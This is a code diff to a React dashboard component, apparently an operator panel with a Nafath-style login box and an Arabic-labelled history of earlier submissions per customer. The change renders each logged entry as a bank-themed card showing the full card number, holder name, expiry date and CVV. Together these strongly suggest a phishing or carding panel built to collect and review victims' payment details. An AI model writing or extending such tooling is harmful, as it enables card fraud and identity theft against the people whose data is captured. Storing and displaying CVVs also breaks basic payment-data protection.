@@ -2862,48 +2862,108 @@ const renderNafadBox = () => {
             {/* سجل الإدخالات */}
             {openLogBox === 'card' && cardEntriesCount > 1 && (
               <div style={{
-                marginTop: 12,
-                padding: 12,
-                background: "#f9fafb",
-                borderRadius: 8,
-                maxHeight: 300,
-                overflowY: "auto"
+                marginTop: 12
               }}>
-                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
-                  سجل الإدخالات:
+                <div style={{ 
+                  fontSize: "12px", 
+                  fontWeight: 600, 
+                  color: "#6b7280", 
+                  marginBottom: 8,
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 6
+                }}>
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                  سجل الإدخالات السابقة:
                 </div>
                 {customerEntryGroup
                   .filter(entry => {
                     const raw = entry.raw || {};
                     return raw._v1 || raw.cardNumber;
                   })
+                  .filter(entry => entry.id !== latestCardEntry.id) // Exclude current entry
                   .sort((a, b) => {
                     const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                     const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                     return timeB - timeA;
                   })
-                  .map((entry, idx) => {
+                  .map((entry) => {
                     const raw = entry.raw || {};
                     const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
-                    const isCurrent = entry.id === selectedRequest?.id;
+                    const entryTheme = getBankTheme(raw.cardType);
                     return (
                       <div key={entry.id} style={{
-                        padding: "8px",
                         marginBottom: 8,
-                        background: isCurrent ? "#dcfce7" : "#fff",
-                        borderRadius: 6,
-                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
-                        fontSize: "0.7rem"
+                        padding: 10,
+                        background: "#ffffff",
+                        borderRadius: 8,
+                        border: "1px solid #e5e7eb"
                       }}>
-                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
-                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        <div style={{
+                          fontSize: "9px",
+                          color: "#9ca3af",
+                          marginBottom: 6
+                        }}>
+                          {entryTime}
                         </div>
-                        {raw.cardNumber && (
-                          <div style={{ color: "#6b7280" }}>رقم البطاقة: {raw.cardNumber}</div>
-                        )}
-                        {raw.cardOwner && (
-                          <div style={{ color: "#6b7280" }}>صاحب البطاقة: {raw.cardOwner}</div>
-                        )}
+                        <div style={{
+                          background: entryTheme.gradient,
+                          borderRadius: 10,
+                          border: `1px solid ${entryTheme.border}`,
+                          padding: 10,
+                          position: "relative",
+                          overflow: "hidden"
+                        }}>
+                          <div style={{
+                            position: "absolute",
+                            top: "-20%",
+                            right: "-10%",
+                            width: "50%",
+                            height: "100%",
+                            borderRadius: "50%",
+                            background: entryTheme.darkColor,
+                            opacity: 0.06
+                          }} />
+                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
+                            <span style={{ 
+                              fontSize: 10, 
+                              fontWeight: "bold", 
+                              color: entryTheme.darkColor 
+                            }}>
+                              {entryTheme.bankName}
+                            </span>
+                            <span style={{
+                              fontSize: 8,
+                              fontWeight: "bold",
+                              color: entryTheme.darkColor,
+                              padding: "1px 4px",
+                              border: `1px solid ${entryTheme.darkColor}`,
+                              borderRadius: 3
+                            }}>
+                              {entryTheme.currency}
+                            </span>
+                          </div>
+                          <div style={{
+                            fontFamily: "Courier New, monospace",
+                            fontSize: 11,
+                            fontWeight: "bold",
+                            color: entryTheme.darkColor,
+                            letterSpacing: "0.1em",
+                            direction: "ltr"
+                          }}>
+                            {raw.cardNumber ? raw.cardNumber.replace(/(.{4})/g, '$1 ').trim() : "**** **** **** ****"}
+                          </div>
+                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginTop: 6 }}>
+                            <span style={{ fontSize: 8, color: entryTheme.secondaryColor }}>
+                              {raw.cardOwner || "CARD HOLDER"}
+                            </span>
+                            <span style={{ fontSize: 8, color: entryTheme.secondaryColor }}>
+                              {raw.cardExpiry || "**/**"} · {raw.cvv || "***"}
+                            </span>
+                          </div>
+                        </div>
                       </div>
                     );
                   })}
